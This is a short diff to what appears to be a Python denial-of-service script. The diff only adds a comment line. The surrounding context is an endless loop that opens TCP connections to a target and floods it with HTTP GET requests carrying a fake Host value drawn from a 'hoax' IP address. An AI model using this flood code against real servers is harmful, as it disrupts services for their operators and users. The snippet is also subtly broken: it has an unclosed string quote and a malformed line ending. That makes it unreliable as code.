@@ -12,6 +12,7 @@ hoax_ip = '182.88.100.56' # this is just some manufactured ip that is supposed t
 def ddos():
   while True: # endless loop
     x = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # the AF_INET is to communicate with a ipv4 address for ipv6 just put the 6 in the end
+    # SOCK_STREAM is used to create a tcp socket
     x.connect((the_target, port)) # connecting to it
     x.sendto(("GET /" + the_target + " HTTP/1.1\r\n").encode("ascii"), (the_target, port))
     x.sendto(("Host: " + hoax_ip + "r\n\r\n").encode("ascii), (the_target, port))
